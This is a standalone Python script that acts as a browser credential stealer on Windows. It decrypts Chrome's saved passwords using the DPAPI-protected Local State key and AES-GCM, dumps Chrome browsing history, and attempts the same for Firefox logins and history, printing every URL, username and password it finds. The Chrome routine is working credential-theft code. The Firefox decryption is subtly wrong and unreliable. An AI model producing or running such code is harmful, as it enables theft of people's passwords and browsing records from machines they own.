import os
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import json
import base64
from Cryptodome.Protocol.KDF import PBKDF2


def decrypt_chrome_password(encrypted_password, key):
    try:
        if encrypted_password[:3] == b'v10':
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload).decode('utf-8')
        else:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
    except Exception as e:
        return f"Error: {e}"


def get_chrome_data():
    try:
        local_state_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Local State")
        with open(local_state_path, "r") as f:
            local_state = json.loads(f.read())
        encryption_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encryption_key = win32crypt.CryptUnprotectData(encryption_key[5:], None, None, None, 0)[1]

        db_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
        shutil.copyfile(db_path, "ChromeData.db")

        conn = sqlite3.connect("ChromeData.db")
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        print("=== Chrome Passwords ===")
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]
            decrypted_password = decrypt_chrome_password(encrypted_password, encryption_key)
            print(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n")

        conn.close()
        os.remove("ChromeData.db")
    except Exception as e:
        print(f"Error fetching Chrome data: {e}")


def get_chrome_history():
    try:
        db_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
        shutil.copyfile(db_path, "ChromeHistory.db")

        conn = sqlite3.connect("ChromeHistory.db")
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")

        print("=== Chrome Browsing History ===")
        for row in cursor.fetchall():
            print(f"URL: {row[0]}\nTitle: {row[1]}\nVisits: {row[2]}\nLast Visited: {row[3]}\n")

        conn.close()
        os.remove("ChromeHistory.db")
    except Exception as e:
        print(f"Error fetching Chrome history: {e}")


def decrypt_firefox_password(encrypted_password, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(base64.b64decode(encrypted_password))
    return decrypted.decode('utf-8', errors='ignore').strip()


def get_firefox_data():
    try:
        profile_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
        profiles = [p for p in os.listdir(profile_path) if os.path.isdir(os.path.join(profile_path, p))]
        if not profiles:
            print("No Firefox profiles found.")
            return

        profile_folder = os.path.join(profile_path, profiles[0])
        logins_file = os.path.join(profile_folder, "logins.json")
        key_file = os.path.join(profile_folder, "key4.db")

        conn = sqlite3.connect(key_file)
        cursor = conn.cursor()
        cursor.execute("SELECT item1, item2 FROM metadata WHERE id = 'password';")
        row = cursor.fetchone()
        global_salt = row[0]
        encrypted_key = row[1]
        conn.close()

        key = PBKDF2(global_salt, b"password-check", dkLen=32)

        with open(logins_file, "r") as f:
            logins = json.load(f)

        print("=== Firefox Passwords ===")
        for login in logins["logins"]:
            encrypted_password = login["encryptedPassword"]
            iv = base64.b64decode(login["iv"])
            decrypted_password = decrypt_firefox_password(encrypted_password, key, iv)
            print(f"URL: {login['hostname']}\nUsername: {login['username']}\nPassword: {decrypted_password}\n")
    except Exception as e:
        print(f"Error fetching Firefox data: {e}")


def get_firefox_history():
    try:
        profile_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
        profiles = [p for p in os.listdir(profile_path) if os.path.isdir(os.path.join(profile_path, p))]
        if not profiles:
            print("No Firefox profiles found.")
            return

        profile_folder = os.path.join(profile_path, profiles[0])
        places_db = os.path.join(profile_folder, "places.sqlite")
        shutil.copyfile(places_db, "FirefoxHistory.db")

        conn = sqlite3.connect("FirefoxHistory.db")
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, visit_count, last_visit_date FROM moz_places")

        print("=== Firefox Browsing History ===")
        for row in cursor.fetchall():
            print(f"URL: {row[0]}\nTitle: {row[1]}\nVisits: {row[2]}\nLast Visited: {row[3]}\n")

        conn.close()
        os.remove("FirefoxHistory.db")
    except Exception as e:
        print(f"Error fetching Firefox history: {e}")


if __name__ == "__main__":
    print("Extracting Chrome data...")
    get_chrome_data()
    get_chrome_history()

    print("\nExtracting Firefox data...")
    get_firefox_data()
    get_firefox_history()
